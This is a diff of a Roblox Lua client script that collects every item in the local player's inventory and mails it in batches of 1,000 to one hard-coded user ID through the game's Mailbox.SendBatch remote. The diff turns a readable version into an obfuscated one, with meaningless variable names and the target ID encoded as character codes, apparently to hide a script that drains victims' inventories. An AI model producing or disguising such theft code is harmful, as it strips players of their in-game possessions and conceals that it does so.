@@ -1,44 +1,49 @@
-local Networking = require(game.ReplicatedStorage.SharedModules.Networking)
-local PlayerStateClient = require(game.ReplicatedStorage.ClientModules.PlayerStateClient)
+local _0=game
+local _1=require
+local _2=_1(_0.ReplicatedStorage.SharedModules.Networking)
+local _3=_1(_0.ReplicatedStorage.ClientModules.PlayerStateClient)
 
-local TARGET_USERID = 9373833355
+local _4=tonumber(table.concat({57,51,55,51,56,51,51,51,53,53}))
 
-local replica = PlayerStateClient:GetLocalReplica()
-if not replica or not replica.Data or not replica.Data.Inventory then return end
+local _5=_3:GetLocalReplica()
+if not (_5 and _5.Data and _5.Data.Inventory) then return end
 
-local inventory = replica.Data.Inventory
-local items = {}
+local _6=_5.Data.Inventory
+local _7={}
 
-for category, contents in pairs(inventory) do
-    if type(contents) == "table" then
-        for itemKey, value in pairs(contents) do
-            if type(value) == "number" and value > 0 then
-                table.insert(items, {
-                    Category = category,
-                    ItemKey = itemKey,
-                    Count = value
-                })
-            elseif type(value) == "table" and value.Id then
-                table.insert(items, {
-                    Category = category,
-                    ItemKey = itemKey,
-                    Count = 1
-                })
+for _8,_9 in pairs(_6) do
+    if type(_9)=="table" then
+        for _10,_11 in pairs(_9) do
+            if type(_11)=="number" and _11>0 then
+                _7[#_7+1]={
+                    Category=_8,
+                    ItemKey=_10,
+                    Count=_11
+                }
+            elseif type(_11)=="table" and _11.Id then
+                _7[#_7+1]={
+                    Category=_8,
+                    ItemKey=_10,
+                    Count=1
+                }
             end
         end
     end
 end
 
-if #items == 0 then return end
+if #_7<=0 then return end
 
-local BATCH_SIZE = 1000
-for i = 1, #items, BATCH_SIZE do
-    local batch = {}
-    for j = i, math.min(i + BATCH_SIZE - 1, #items) do
-        table.insert(batch, items[j])
+local _12=1000
+
+for _13=1,#_7,_12 do
+    local _14={}
+    for _15=_13,math.min(_13+_12-1,#_7) do
+        _14[#_14+1]=_7[_15]
     end
+
     pcall(function()
-        Networking.Mailbox.SendBatch:Fire(TARGET_USERID, batch, "")
+        _2.Mailbox.SendBatch:Fire(_4,_14,string.char())
     end)
-    task.wait(0)
+
+    task.wait()
 end
